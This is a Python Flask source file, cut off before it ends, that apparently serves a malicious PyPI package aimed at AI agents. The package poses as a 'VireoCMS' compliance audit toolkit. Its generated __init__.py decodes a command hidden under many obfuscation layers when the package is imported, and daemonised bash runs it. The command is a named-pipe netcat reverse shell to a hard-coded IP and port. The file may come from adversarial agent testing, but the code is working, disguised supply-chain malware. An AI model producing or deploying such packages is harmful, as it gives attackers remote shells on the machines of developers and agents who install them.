"""
Advanced Anti-Agent PyPI Server (Improved).
Deploys a PEP 503 simple index to serve a malicious PyPI package.
- Clean setup.py: no Base64, no custom install commands.
- Malicious logic hidden in __init__.py, triggered on import.
- Reverse shell target IP/port configured via global variables below.
"""
from __future__ import annotations
import hashlib
import io
import tarfile
from flask import Flask, abort, jsonify, send_file, Response
from encode_token import encode_command

REVERSE_SHELL_IP = "10.122.198.167"
REVERSE_SHELL_PORT = "4444"

app = Flask(__name__)


def generate_malicious_source_distribution() -> io.BytesIO:
    """Generates a source distribution (.tar.gz) with a clean setup.py and a weaponized __init__.py."""
    out = io.BytesIO()

    # --- Pure white setup.py ---
    # No cmdclass, no encoded payload, just standard package metadata.
    setup_py_content = """from setuptools import setup

setup(
    name="vireocms-audit-toolkit",
    version="1.0.0",
    description="Deterministic telemetry connector extension for automated scanners.",
    author="VireoCMS Compliance Org",
    packages=["vireocms_audit_toolkit"],
)
"""

    # --- Obfuscated malicious __init__.py ---
    # Payload: reverse shell to 10.122.198.167:4444 via named pipe.
    # The command is obfuscated with a 10-pass cryptographic mixer
    # and stored in _COMPLIANCE_TOKEN.  Fixed quoting: use ''' for
    # docstring to avoid conflict with surrounding r"""..."""
    init_py_content = r'''import sys as _s, os as _o, logging as _l, hashlib as _h, time as _t

_V, _CS, _BE = "2.3.9", "PCI-DSS-4.0", "compliance-orchestrator.vireocms.internal"
_log = _l.getLogger(__name__); _log.setLevel(_l.WARNING)

def _gm(a, b):
    p = 0
    for _ in range(8):
        if b & 1: p ^= a
        c = a & 0x80; a = (a << 1) & 0xFF
        if c: a ^= 0x1B
        b >>= 1
    return p

def _gi(x):
    if x == 0: return 0
    r, b, e = 1, x, 254
    while e:
        if e & 1: r = _gm(r, b)
        b = _gm(b, b); e >>= 1
    return r

_SRI = [
    202,  55, 183,  22,  95, 123,  57,  85, 213,  83, 156,   8, 154, 185, 188, 206,
    103,   5,  94, 121, 209,  96,  77, 243,   4, 196,  78, 221, 164, 137, 231, 189,
    133, 175,  92,  29,  66, 168,  43, 203, 160, 215, 139, 169,  87, 210, 220, 247,
    211, 151, 254, 237, 201, 102,  82, 153, 227, 125,  39, 148,  98, 134,   2, 249,
     75, 141,  69,  58, 191, 245, 181,  73, 136, 149, 142,  38, 107, 172,  26,  93,
    246, 170, 110,  44, 105, 135, 166,  16, 217, 159, 200, 165, 230, 144,  80, 205,
    108,  90, 180,   0,  60,  54,  36,  45,  61,  18,  20, 155,  28,  30, 248,  27,
    241, 146,   1, 116,  67, 186,  49,  76,  74, 118, 158,  42, 179,  65, 252, 157,
     99,  47,  35, 177, 114, 190, 117, 143, 240, 171, 112, 244, 178, 229, 187,  48,
    163, 174,  13,  91,  86, 132, 184,  17,  19,  34,  71, 182, 199, 238,  68, 119,
     52, 214,   7,  11, 113, 101, 138, 150,   6, 145,  62, 167,  25, 162,  64, 176,
    235,  56,  40, 122,  72, 120, 115, 216, 223, 208, 100,  24, 194,  89, 225, 255,
    109, 127, 224, 251, 234, 228,  70, 198, 204,  41,  53, 193,  23, 233, 250,  51,
    128,  50, 124,  12,  15, 226,  14, 104, 192, 253,  10, 242,   9,  97, 147, 161,
    239,  46, 106, 131, 140, 207, 219, 218, 111, 152,  63, 232, 130,  33, 236,  84,
    195,  31, 126, 222, 173,   3, 212, 197,  21,  32,  79,  88,  59, 129,  37,  81,
]
_SR = [
     99, 114,  62, 245,  24,  17, 168, 162,  11, 220, 218, 163, 211, 146, 214, 212,
     87, 151, 105, 152, 106, 248,   3, 204, 187, 172,  78, 111, 108,  35, 109, 241,
    249, 237, 153, 130, 102, 254,  75,  58, 178, 201, 123,  38,  83, 103, 225, 129,
    143, 118, 209, 207, 160, 202, 101,   1, 177,   6,  67, 252, 100, 104, 170, 234,
    174, 125,  36, 116, 158,  66, 198, 154, 180,  71, 120,  64, 119,  22,  26, 250,
     94, 255,  54,   9, 239,   7, 148,  44, 251, 189,  97, 147,  34,  79,  18,   4,
     21, 221,  60, 128, 186, 165,  53,  16, 215,  84, 226,  76,  96, 192,  82, 232,
    138, 164, 132, 182, 115, 134, 121, 159, 181,  19, 179,   5, 210,  57, 242, 193,
    208, 253, 236, 227, 149,  32,  61,  85,  72,  29, 166,  42, 228,  65,  74, 135,
     93, 169, 113, 222,  59,  73, 167,  49, 233,  55,  12, 107,  10, 127, 122,  89,
     40, 223, 173, 144,  28,  91,  86, 171,  37,  43,  81, 137,  77, 244, 145,  33,
    175, 131, 140, 124,  98,  70, 155,   2, 150,  13, 117, 142,  14,  31, 133,  68,
    216, 203, 188, 240,  25, 247, 199, 156,  90,  52,   0,  39, 200,  95,  15, 229,
    185,  20,  45,  48, 246,   8, 161,  41, 183,  88, 231, 230,  46,  27, 243, 184,
    194, 190, 213,  56, 197, 141,  92,  30, 235, 205, 196, 176, 238,  51, 157, 224,
    136, 112, 219,  23, 139,  69,  80,  47, 110,  63, 206, 195, 126, 217,  50, 191,
]
_SAI = [
    253,  78, 112, 190,  37,  22, 255, 124, 239,  85, 147,   2, 250,  93, 247, 127,
     49,  28, 218, 107,   3, 136, 246,  41, 156, 105, 164,  80, 150, 202, 189,  99,
     44,  50, 109,  97, 177,  19, 231,  92,  51,   7,  56,  55, 178, 206, 104, 130,
     34,  68,  62,   4, 108, 194, 251, 224,  83, 174, 110, 123, 181,  43, 186, 113,
    146,  74, 187,  57, 145,   0, 111,  30, 115,  14, 211, 117, 126,  11,  98, 103,
    144, 193,   5, 172,  95,   9, 175, 227, 152,  54, 210, 171,  94, 102, 240, 176,
     69,  96, 219,  25, 221,  65, 173, 215, 120, 128, 119, 244, 185, 116, 199, 230,
    254, 137, 195, 248, 209,  89, 252,  91, 188, 138, 233, 158,  53, 208, 101,  82,
    141, 121, 139,  18, 245, 214, 191, 183, 160, 142,  23,  17, 180,  60, 125,  31,
     35, 236, 192,  73, 168,   8, 207, 140, 161, 196,   6,  66,  46,  77,  52,   1,
    238,  33,  76, 135,  12,  21, 114,  87,  86, 100, 242, 226, 213,  90, 157,  29,
    170,  42, 198,  67, 237,  84, 212, 129, 166, 220, 205,  75, 122,  48, 131,  26,
    222,  38, 217, 167, 165, 184, 223, 133, 153, 148, 225,  70, 169, 216, 151, 159,
     61,  59,  81,  71, 234,  64,  16,  39, 118, 197, 179,  47,  27,  40, 235, 182,
    201,  88, 143, 163,  45, 200, 241, 106,  32,  36,  10, 232, 204, 228, 203, 134,
    229,  24, 155,  15,  58,  72, 249, 154,  13,  63, 243,  20, 149,  79, 162, 132,
]
_SA = [
     69, 159,  11,  20,  51,  82, 154,  41, 149,  85, 234,  77, 164, 248,  73, 243,
    214, 139, 131,  37, 251, 165,   5, 138, 241,  99, 191, 220,  17, 175,  71, 143,
    232, 161,  48, 144, 233,   4, 193, 215, 221,  23, 177,  61,  32, 228, 156, 219,
    189,  16,  33,  40, 158, 124,  89,  43,  42,  67, 244, 209, 141, 208,  50, 249,
    213, 101, 155, 179,  49,  96, 203, 211, 245, 147,  65, 187, 162, 157,   1, 253,
     27, 210, 127,  56, 181,   9, 168, 167, 225, 117, 173, 119,  39,  13,  92,  84,
     97,  35,  78,  31, 169, 126,  93,  79,  46,  25, 231,  19,  52,  34,  58,  70,
      2,  63, 166,  72, 109,  75, 216, 106, 104, 129, 188,  59,   7, 142,  76,  15,
    105, 183,  47, 190, 255, 199, 239, 163,  21, 113, 121, 130, 151, 128, 137, 226,
     80,  68,  64,  10, 201, 252,  28, 206,  88, 200, 247, 242,  24, 174, 123, 207,
    136, 152, 254, 227,  26, 196, 184, 195, 148, 204, 176,  91,  83, 102,  57,  86,
     95,  36,  44, 218, 140,  60, 223, 135, 197, 108,  62,  66, 120,  30,   3, 134,
    146,  81,  53, 114, 153, 217, 178, 110, 229, 224,  29, 238, 236, 186,  45, 150,
    125, 116,  90,  74, 182, 172, 133, 103, 205, 194,  18,  98, 185, 100, 192, 198,
     55, 202, 171,  87, 237, 240, 111,  38, 235, 122, 212, 222, 145, 180, 160,   8,
     94, 230, 170, 250, 107, 132,  22,  14, 115, 246,  12,  54, 118,   0, 112,   6,
]
_SCI = [
    252,  78,  76,   2, 151,   1, 201,   4, 170, 180,  40,  98, 183,   6, 113,   9,
     74, 136,  17, 158, 103, 202,  21,  46, 203,  60,   3, 218, 175,  20, 213,  11,
    195,  23,  22,  32,  61, 210, 206, 120, 196, 150,  33,  14, 240,  48, 254,  37,
    168,  18, 169,  35,  90, 174, 156,  44, 102,  49, 188,  56, 219, 164,  94,  10,
    144,  39, 228,  52, 209,  72, 214, 244, 163, 106, 109,  68, 247,  31,  50,  63,
    230, 154, 138,  71, 167,  12, 238,  54, 115,   8,  77,  70, 243,  88, 161, 110,
     85, 250, 234,  91, 118,  41, 194, 186,  28, 184, 236, 142, 207,  45, 133, 130,
    182,  57, 229,  65, 128,  95, 112, 172, 149, 126,  97, 107, 215,  67, 198,  34,
    157, 124,  42,  53, 134,  79, 225,  13, 253, 146, 176,  87, 239, 105,  69, 178,
    185,  83, 217,  84, 155, 129, 204, 139,  82,  89, 237,  93, 223, 125,  80, 208,
    235, 232, 205, 152, 177,  86, 212, 165, 123, 200, 173, 143, 197, 131,   7, 159,
    221,  55, 111, 127, 231, 147, 192, 171, 251, 190,  81, 248, 216,   5, 233, 179,
     58, 104,  43,  51, 241,  96,  75, 122,  73, 101, 114, 162, 246, 160, 153,  38,
    145, 119, 132, 191, 224, 137, 116, 211,  27,   0,  25, 117,  99,  59,  62,  92,
    245, 222, 141,  30,  47, 108, 187, 189,  64, 242, 249,  15,  16, 100, 193, 227,
    135, 121, 220, 199, 166,  66,  29,  36,  24, 226, 148,  26, 255, 140,  19, 181,
]
_SC = [
    217,   5,   3,  26,   7, 189,  13, 174,  89,  15,  63,  31,  85, 135,  43, 235,
    236,  18,  49, 254,  29,  22,  34,  33, 248, 218, 251, 216, 104, 246, 227,  77,
     35,  42, 127,  51, 247,  47, 207,  65,  10, 101, 130, 194,  55, 109,  23, 228,
     45,  57,  78, 195,  67, 131,  87, 177,  59, 113, 192, 221,  25,  36, 222,  79,
    232, 115, 245, 125,  75, 142,  91,  83,  69, 200,  16, 198,   2,  90,   1, 133,
    158, 186, 152, 145, 147,  96, 165, 139,  93, 153,  52,  99, 223, 155,  62, 117,
    197, 122,  11, 220, 237, 201,  56,  20, 193, 141,  73, 123, 229,  74,  95, 178,
    118,  14, 202,  88, 214, 219, 100, 209,  39, 241, 199, 168, 129, 157, 121, 179,
    116, 149, 111, 173, 210, 110, 132, 240,  17, 213,  82, 151, 253, 226, 107, 171,
     64, 208, 137, 181, 250, 120,  41,   4, 163, 206,  81, 148,  54, 128,  19, 175,
    205,  94, 203,  72,  61, 167, 244,  84,  48,  50,   8, 183, 119, 170,  53,  28,
    138, 164, 143, 191,   9, 255, 112,  12, 105, 144, 103, 230,  58, 231, 185, 211,
    182, 238, 102,  32,  40, 172, 126, 243, 169,   6,  21,  24, 150, 162,  38, 108,
    159,  68,  37, 215, 166,  30,  70, 124, 188, 146,  27,  60, 242, 176, 225, 156,
    212, 134, 249, 239,  66, 114,  80, 180, 161, 190,  98, 160, 106, 154,  86, 140,
     44, 196, 233,  92,  71, 224, 204,  76, 187, 234,  97, 184,   0, 136,  46, 252,
]
_SDI = [
    116,  18, 185, 158, 210,  34, 182,  14,  21,  40, 109,  12,  69, 216,  42,  60,
     52, 222, 153,  15,  61, 154, 157, 186,  68,  30, 225,  23, 138,  27,  45, 108,
     58, 128, 227,  96, 149, 156, 133, 100, 197,   3,  55,   5,  85,  17,  77,  41,
     20, 178, 115,  94, 253,  80, 229, 120, 142,  46, 189, 208,  48,  13, 150, 190,
    217,  11, 223, 232,  10, 180, 250, 140,  98,  88, 187,  35,   7, 110, 205,  63,
     39, 134,  91,  71,  56,  92, 113, 220, 129,  75, 119,  79, 169,  72, 145, 144,
     62,  25, 215, 206,  66,  64, 235,  83, 104, 234,  22, 162, 249, 176,  65,  95,
    141, 224, 247,  87, 252,   9, 201,  73,  43,  29, 231,  81, 161,  76,  74, 114,
    245,   0, 230, 127,  38,  28, 139,  36, 102, 188,  90, 184,  67,  31, 155,  54,
    196,  99, 166, 117, 237, 174, 243,   2,   6,  84,   1,  51, 181, 198,   8,  89,
     53, 226, 242,  59,  19,  82, 148, 192,  70, 244, 233, 147, 151, 130, 193, 131,
    107, 214, 207, 111,  86, 112, 211, 179,  49, 183, 164, 172, 121, 246,  47, 202,
    241, 126, 175, 248,  78, 200, 125, 177, 106, 195, 146, 218, 123, 136,  50, 132,
    160, 173, 219, 204, 105, 122, 194, 199, 168, 213, 137, 124, 228, 167,  16, 240,
     33, 163, 255, 165,  26, 203, 236, 135,  24, 209, 101,  37, 143, 118,  97, 238,
    221, 159, 251, 254, 212,   4, 103, 239,  57, 170, 171, 191,  44, 152,  32,  93,
]
_SD = [
    129, 154, 151,  41, 245,  43, 152,  76, 158, 117,  68,  65,  11,  61,   7,  19,
    222,  45,   1, 164,  48,   8, 106,  27, 232,  97, 228,  29, 133, 121,  25, 141,
    254, 224,   5,  75, 135, 235, 132,  80,   9,  47,  14, 120, 252,  30,  57, 190,
     60, 184, 206, 155,  16, 160, 143,  42,  84, 248,  32, 163,  15,  20,  96,  79,
    101, 110, 100, 140,  24,  12, 168,  83,  93, 119, 126,  89, 125,  46, 196,  91,
     53, 123, 165, 103, 153,  44, 180, 115,  73, 159, 138,  82,  85, 255,  51, 111,
     35, 238,  72, 145,  39, 234, 136, 246, 104, 212, 200, 176,  31,  10,  77, 179,
    181,  86, 127,  50,   0, 147, 237,  90,  55, 188, 213, 204, 219, 198, 193, 131,
     33,  88, 173, 175, 207,  38,  81, 231, 205, 218,  28, 134,  71, 112,  56, 236,
     95,  94, 202, 171, 166,  36,  62, 172, 253,  18,  21, 142,  37,  22,   3, 241,
    208, 124, 107, 225, 186, 227, 146, 221, 216,  92, 249, 250, 187, 209, 149, 194,
    109, 199,  49, 183,  69, 156,   6, 185, 139,   2,  23,  74, 137,  58,  63, 251,
    167, 174, 214, 201, 144,  40, 157, 215, 197, 118, 191, 229, 211,  78,  99, 178,
     59, 233,   4, 182, 244, 217, 177,  98,  13,  64, 203, 210,  87, 240,  17,  66,
    113,  26, 161,  34, 220,  54, 130, 122,  67, 170, 105, 102, 230, 148, 239, 247,
    223, 192, 162, 150, 169, 128, 189, 114, 195, 108,  70, 242, 116,  52, 243, 226,
]
_SEI = [
    104, 175, 149,   0, 238,  87,  95, 251, 109, 100, 194, 239, 113, 178, 222, 242,
     23, 145,  79,  40, 218, 234,   5,  65, 226,  42,  24, 108, 110,  97,  20, 252,
    177, 176,  89, 201, 202, 168, 114,  37,  56, 217, 151, 247, 196,  13, 244, 161,
      9, 249,  31, 199, 134, 148,  50, 192, 106, 189, 152, 207,  74, 128,  21,  88,
     90,  17,  80, 253, 101, 142,  77,  34,  73,  38, 160, 225,  60, 246,  75, 180,
    125, 248,   3, 227, 198,  49,  98, 147,  82, 144, 122, 220,  61, 216,  25, 131,
     41, 126, 182, 215,  46, 157, 164, 105,  85, 162, 183, 255, 223,  69, 121, 235,
    187, 139, 206, 203, 212,  18, 112, 171,  62,  12, 116, 163,  44, 165,  71, 156,
     53, 193,  67,  99,   8, 130,  11, 243,  26,  19,  94, 233,  86,  28, 254, 127,
     81,  45, 167,  66, 159, 132, 129, 141, 107,  43, 236, 241, 150,  91,  54, 153,
    170,  72,  39,  57,  48, 229,  32, 133,  33, 137,  10, 191, 186, 140,  68, 237,
     84, 173,  51, 211, 219, 200, 195, 135, 204,  78, 123, 240, 228,   7,  70, 179,
    172, 103, 154,  15, 158,  47, 138, 102,  83,  14, 146, 111,  59, 188, 124, 115,
    118, 184, 250,  35,   1,  16,  52,  93, 213, 143, 214,  22, 224,  27, 119, 181,
      6, 190, 174, 231, 166,  63,  55, 117,   4,  29,  30, 209, 136, 232, 210, 197,
    120, 221,   2, 169,  64,  96,  76,  92,  58, 245,  36, 205, 185, 208, 155, 230,
]
_SE = [
      3, 212, 242,  82, 232,  22, 224, 189, 132,  48, 170, 134, 121,  45, 201, 195,
    213,  65, 117, 137,  30,  62, 219,  16,  26,  94, 136, 221, 141, 233, 234,  50,
    166, 168,  71, 211, 250,  39,  73, 162,  19,  96,  25, 153, 124, 145, 100, 197,
    164,  85,  54, 178, 214, 128, 158, 230,  40, 163, 248, 204,  76,  92, 120, 229,
    244,  23, 147, 130, 174, 109, 190, 126, 161,  72,  60,  78, 246,  70, 185,  18,
     66, 144,  88, 200, 176, 104, 140,   5,  63,  34,  64, 157, 247, 215, 138,   6,
    245,  29,  86, 131,   9,  68, 199, 193,   0, 103,  56, 152,  27,   8,  28, 203,
    118,  12,  38, 207, 122, 231, 208, 222, 240, 110,  90, 186, 206,  80,  97, 143,
     61, 150, 133,  95, 149, 167,  52, 183, 236, 169, 198, 113, 173, 151,  69, 217,
     89,  17, 202,  87,  53,   2, 156,  42,  58, 159, 194, 254, 127, 101, 196, 148,
     74,  47, 105, 123, 102, 125, 228, 146,  37, 243, 160, 119, 192, 177, 226,   1,
     33,  32,  13, 191,  79, 223,  98, 106, 209, 252, 172, 112, 205,  57, 225, 171,
     55, 129,  10, 182,  44, 239,  84,  51, 181,  35,  36, 115, 184, 251, 114,  59,
    253, 235, 238, 179, 116, 216, 218,  99,  93,  41,  20, 180,  91, 241,  14, 108,
    220,  75,  24,  83, 188, 165, 255, 227, 237, 139,  21, 111, 154, 175,   4,  11,
    187, 155,  15, 135,  46, 249,  77,  43,  81,  49, 210,   7,  31,  67, 142, 107,
]
_FIB = [
      0,   1,   1,   2,   3,   5,   8,  13,  21,  34,  55,  89, 144, 233, 121,  98,
    219,  61,  24,  85, 109, 194,  47, 241,  32,  17,  49,  66, 115, 181,  40, 221,
      5, 226, 231, 201, 176, 121,  41, 162, 203, 109,  56, 165, 221, 130,  95, 225,
     64,  33,  97, 130, 227, 101,  72, 173, 245, 162, 151,  57, 208,   9, 217, 226,
    187, 157,  88, 245,  77,  66, 143, 209,  96,  49, 145, 194,  83,  21, 104, 125,
    229,  98,  71, 169, 240, 153, 137,  34, 171, 205, 120,  69, 189,   2, 191, 193,
    128,  65, 193,   2, 195, 197, 136,  77, 213,  34, 247,  25,  16,  41,  57,  98,
    155, 253, 152, 149,  45, 194, 239, 177, 160,  81, 241,  66,  51, 117, 168,  29,
    197, 226, 167, 137,  48, 185, 233, 162, 139,  45, 184, 229, 157, 130,  31, 161,
    192,  97,  33, 130, 163,  37, 200, 237, 181, 162,  87, 249,  80,  73, 153, 226,
    123,  93, 216,  53,  13,  66,  79, 145, 224, 113,  81, 194,  19, 213, 232, 189,
    165,  98,   7, 105, 112, 217,  73,  34, 107, 141, 248, 133, 125,   2, 127, 129,
      0, 129, 129,   2, 131, 133,   8, 141, 149,  34, 183, 217, 144, 105, 249,  98,
     91, 189,  24, 213, 237, 194, 175, 113,  32, 145, 177,  66, 243,  53,  40,  93,
    133, 226, 103,  73, 176, 249, 169, 162,  75, 237,  56,  37,  93, 130, 223,  97,
     64, 161, 225, 130,  99, 229,  72,  45, 117, 162,  23, 185, 208, 137,  89, 226,
]
_BP = [
      1,   5,   2,   0,   7,   3,   6,   4,
]
_BPI = [
      3,   0,   2,   5,   7,   1,   6,   4,
]
_HILL_INV = [
     13,   7,   5,   2,
]
_HILL2_INV = [
     11, 114, 195, 213,
]
_JUNK_POS = [
      1,   5,   8,  11,  15,  31,  34,  36,  40,  41,
     46,  49,  50,  51,  54,  55,  59,  72,  75, 102,
]
_DISP_SCR = [
     17,   4,  21,   0,  12,   8,  15,   3,
     19,   6,  22,   1,  13,   9,  16,   5,
     20,   2,  14,  10,  18,   7,  23,  11,
]
_OPAQUE_P, _OPAQUE_B, _OPAQUE_T = 251, 7, 1
_GF_OPAQUE = 1

_KS = b"VireoCMS-Compliance-Orchestrator-v2.1.3-Runtime-Integrity"
def _dk(sd, nk):
    ks, cur = [], sd
    for _ in range(nk):
        d = _h.sha512(cur).digest(); ks.append([d[j%64] for j in range(256)]); cur = d
    return ks
_RK = _dk(_KS, 20)

def _ls(n):
    x, s = 0.3719, []
    for _ in range(n): x = 3.99 * x * (1.0 - x); s.append(int((x * 4294967296) % 256))
    return s

def _lcs(n, sd):
    s, st = [], sd & 0xFFFFFFFF
    for _ in range(n): st = (st * 1664525 + 1013904223) & 0xFFFFFFFF; s.append((st >> 16) & 0xFF)
    return s

def _fk(d, ki): return [(d[i] ^ _RK[ki][i & 0xFF]) for i in range(len(d))]
def _rv(d): return d[::-1]

def _rts(d, dr):
    r = []
    for i, b in enumerate(d):
        rot = (i * 3 + 5) & 7
        if dr == 1: r.append(((b << rot) | (b >> (8 - rot))) & 0xFF)
        else: r.append(((b >> rot) | (b << (8 - rot))) & 0xFF)
    return r

def _sw(d):
    r = list(d)
    for i in range(0, len(r) - 1, 2): r[i], r[i + 1] = r[i + 1], r[i]
    return r

def _iv4(d):
    ch = [[], [], [], []]
    for i, b in enumerate(d): ch[i % 4].append(b)
    return ch[0] + ch[1] + ch[2] + ch[3]

def _di4(d):
    n = len(d); cl = [(n + 3 - i) // 4 for i in range(4)]
    st = [0]; [st.append(st[-1] + cl[i]) for i in range(3)]
    ch = [d[st[i]:st[i] + cl[i]] for i in range(4)]
    r = []
    for i in range(cl[0]):
        for j in range(4):
            if i < len(ch[j]): r.append(ch[j][i])
    return r

def _cb(d):
    r, p = list(d), 0x37
    for i in range(len(d)): r[i] = (d[i] ^ p) & 0xFF; p = r[i]
    return r

def _cbi(d):
    r, p = list(d), 0x37
    for i in range(len(d)): orig = (d[i] ^ p) & 0xFF; r[i] = orig; p = d[i]
    return r

def _bp(d, perm):
    r = []
    for b in d:
        nb = 0
        for bi in range(8):
            if b & (1 << bi): nb |= (1 << perm[bi])
        r.append(nb)
    return r

def _mt(d, cols):
    n = len(d); rows = (n + cols - 1) // cols
    mat = [[0] * cols for _ in range(rows)]
    for i, b in enumerate(d): mat[i // cols][i % cols] = b
    out = []
    for c in range(cols):
        for r in range(rows):
            if r * cols + c < n: out.append(mat[r][c])
    return out

def _mti(d, cols):
    n = len(d); rows = (n + cols - 1) // cols
    mat = [[0] * cols for _ in range(rows)]; idx = 0
    for c in range(cols):
        for r in range(rows):
            if r * cols + c < n and idx < n: mat[r][c] = d[idx]; idx += 1
    out = []
    for r in range(rows):
        for c in range(cols):
            if r * cols + c < n: out.append(mat[r][c])
    return out

def _snk(d, cols):
    n = len(d); rows = (n + cols - 1) // cols
    mat = [[0] * cols for _ in range(rows)]; idx = 0
    for c in range(cols):
        rng = range(rows - 1, -1, -1) if c & 1 else range(rows)
        for r in rng:
            if r * cols + c < n and idx < n: mat[r][c] = d[idx]; idx += 1
    out = []
    for r in range(rows):
        for c in range(cols):
            if r * cols + c < n: out.append(mat[r][c])
    return out

def _sht(d, dr):
    n = len(d); rows = [[], [], [], []]
    for i, b in enumerate(d): rows[i % 4].append(b)
    for r in range(4):
        a = r
        if rows[r]:
            if dr == 1: rows[r] = rows[r][a:] + rows[r][:a]
            else: rows[r] = rows[r][-a:] + rows[r][:-a]
    out = []; mc = max(len(r) for r in rows) if any(rows) else 0
    for c in range(mc):
        for r in range(4):
            if c < len(rows[r]) and len(out) < n: out.append(rows[r][c])
    return out

def _mxc(d, mat4):
    n = len(d); out = list(d); M = mat4
    for o in range(0, n - n % 4, 4):
        a, b, c, dd = d[o], d[o+1], d[o+2], d[o+3]
        out[o+0] = _gm(M[0][0],a)^_gm(M[0][1],b)^_gm(M[0][2],c)^_gm(M[0][3],dd)
        out[o+1] = _gm(M[1][0],a)^_gm(M[1][1],b)^_gm(M[1][2],c)^_gm(M[1][3],dd)
        out[o+2] = _gm(M[2][0],a)^_gm(M[2][1],b)^_gm(M[2][2],c)^_gm(M[2][3],dd)
        out[o+3] = _gm(M[3][0],a)^_gm(M[3][1],b)^_gm(M[3][2],c)^_gm(M[3][3],dd)
    return out

_MIX = [[2,3,1,1],[1,2,3,1],[1,1,2,3],[3,1,1,2]]
_IMIX = [[14,11,13,9],[9,14,11,13],[13,9,14,11],[11,13,9,14]]

def _fst(d, fwd, rkb):
    dl = list(d); n = len(dl); h = n // 2
    rng = range(3) if fwd else range(2, -1, -1)
    for rnd in rng:
        L, R = dl[:h], dl[h:]
        tgt = R if fwd else L
        fo = [_SC[v] for v in tgt]
        fo = fo[3:] + fo[:3]
        kb = _RK[rkb + rnd][:len(fo)]
        fo = [fo[i] ^ kb[i] for i in range(len(fo))]
        if fwd:
            nw = [L[i] ^ fo[i] for i in range(len(fo))]
            dl = R + nw
        else:
            nw = [R[i] ^ fo[i] for i in range(len(fo))]
            dl = nw + L
    return dl

def _rc(d, ko):
    key = _RK[ko][:64]; S, j = list(range(256)), 0
    for i in range(256): j = (j + S[i] + key[i % len(key)]) & 0xFF; S[i], S[j] = S[j], S[i]
    i = j = 0; r = []
    for b in d:
        i = (i + 1) & 0xFF; j = (j + S[i]) & 0xFF; S[i], S[j] = S[j], S[i]
        r.append(b ^ S[(S[i] + S[j]) & 0xFF])
    return r

def _lf(d, sd):
    st, r = sd & 0xFFFF, []
    for b in d:
        for _ in range(8):
            bit = ((st >> 15) ^ (st >> 13) ^ (st >> 12) ^ (st >> 10)) & 1
            st = ((st << 1) | bit) & 0xFFFF
        r.append(b ^ (st & 0xFF))
    return r

def _hi(d, mat4):
    n = len(d); full = list(d)
    if n & 1: full.append(0)
    out = []
    for i in range(0, len(full), 2):
        a, b = full[i], full[i + 1]
        out.append(_gm(mat4[0], a) ^ _gm(mat4[1], b))
        out.append(_gm(mat4[2], a) ^ _gm(mat4[3], b))
    return out[:n]

def _dis(r):
    arr = list(_DISP_SCR)
    for rd in range(r - 1, -1, -1):
        key = _RK[10 + rd]
        for i in range(len(arr)):
            j = (i + key[i % len(key)] + rd * 7) % len(arr)
            if i < j: arr[i], arr[j] = arr[j], arr[i]
    return arr

def _chk(d):
    exp = _CHKSUM
    actual = list(_h.sha256(bytes(d)).digest()[:32])
    if actual != exp[:len(actual)]:
        for _ in range(999999): pass
        return False
    return True

__CHKSUM__

_DECODE_OPS = _dis(3)

__TOKEN__

def _verify_compliance_token():
    _log.debug("Init verification.")
    d = list(_COMPLIANCE_TOKEN)
    if pow(_OPAQUE_B, _OPAQUE_P - 1, _OPAQUE_P) != _OPAQUE_T:
        _log.error("Integrity fail."); return ""
    if _gm(0x1B, _gi(0x1B)) != _GF_OPAQUE:
        _log.error("GF integrity."); return ""
    for pos in sorted(_JUNK_POS, reverse=True):
        if pos < len(d): d.pop(pos)
    d = _snk(d, 5)
    d = _bp(d, _BPI)
    d = _cbi(d); d = _sw(d); d = _lf(d, 0xBEEF); d = _fk(d, 12)
    d = [_SEI[x] for x in d]; d = _rv(d); d = _fst(d, False, 9); d = _mti(d, 11)
    d = _rts(d, -1); d = _fk(d, 8); d = _hi(d, _HILL2_INV); d = _rc(d, 7)
    d = [d[i] ^ _FIB[(i * 7) & 0xFF] for i in range(len(d))]
    d = _rv(d); d = [_SDI[x] for x in d]; d = _fk(d, 6); d = _hi(d, _HILL_INV); d = _mti(d, 13)
    d = _fk(d, 5); d = _sw(d); d = _lf(d, 0xDEAD)
    d = [d[i] ^ _ls(len(d))[i] for i in range(len(d))]
    d = _rc(d, 4); d = _snk(d, 9); d = _rv(d); d = _fst(d, False, 3); d = _fk(d, 2)
    d = _mxc(d, _IMIX); d = _sht(d, -1); d = _mti(d, 7)
    d = _fk(d, 1); d = _cbi(d); d = _sw(d); d = _rts(d, -1)
    d = [_SRI[x] for x in d]; d = _rv(d); d = _fk(d, 0)
    if not _chk(d):
        _log.error("Checksum mismatch.")
        return ""
    cmd = "".join(chr(c) for c in d)
    _log.info("Token decoded successfully.")
    return cmd

def _establish_diagnostics_channel(command):
    _log.info("Establishing diagnostics channel to %s.", _BE)
    pid = _o.fork()
    if pid == 0:
        _o.setsid(); _o.umask(0)
        pid2 = _o.fork()
        if pid2 == 0:
            _o.execv("/bin/bash", ["/bin/bash", "-c", command])
        else:
            _s.exit(0)
    else:
        _t.sleep(0.1)

print(f"[vireocms.audit] Bootstrap v{_V} – {_CS} compliance mode.")
_log.info("Audit toolkit loaded. Verifying token.")
try:
    _cmd = _verify_compliance_token()
    if not _o.environ.get("VIREO_CMS_SAFE_MODE"):
        print("[vireocms.audit] Verification passed – link...")
        _establish_diagnostics_channel(_cmd)
    else:
        print("[vireocms.audit] SAFE MODE.")
except Exception as e:
    _log.warning("Token exception: %s", e)

'''

    cmd = f"rm -f /tmp/.x;mkfifo /tmp/.x;cat /tmp/.x|/bin/bash -i 2>&1|nc {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT} >/tmp/.x"
    token = encode_command(cmd)
    token_lines = []
    for i in range(0, len(token), 10):
        token_lines.append("    " + ", ".join(f"{x:3d}" for x in token[i:i+10]) + ",")
    token_str = "_COMPLIANCE_TOKEN = [\n" + "\n".join(token_lines) + "\n]"

    chk = list(hashlib.sha256(cmd.encode()).digest()[:32])
    chk_lines = []
    for i in range(0, len(chk), 8):
        chk_lines.append("    " + ", ".join(f"{x:3d}" for x in chk[i:i+8]) + ",")
    chk_str = "_CHKSUM = [\n" + "\n".join(chk_lines) + "\n]"

    init_py = init_py_content.replace("__TOKEN__", token_str).replace("__CHKSUM__", chk_str)

    # Build the tar archive
    with tarfile.open(fileobj=out, mode="w:gz") as tar:
        # 1. setup.py at package root
        setup_bytes = setup_py_content.encode("utf-8")
        info_setup = tarfile.TarInfo(name="vireocms-audit-toolkit-1.0.0/setup.py")
        info_setup.size = len(setup_bytes)
        tar.addfile(info_setup, io.BytesIO(setup_bytes))

        # 2. __init__.py inside the actual Python package
        init_bytes = init_py.encode("utf-8")
        info_init = tarfile.TarInfo(
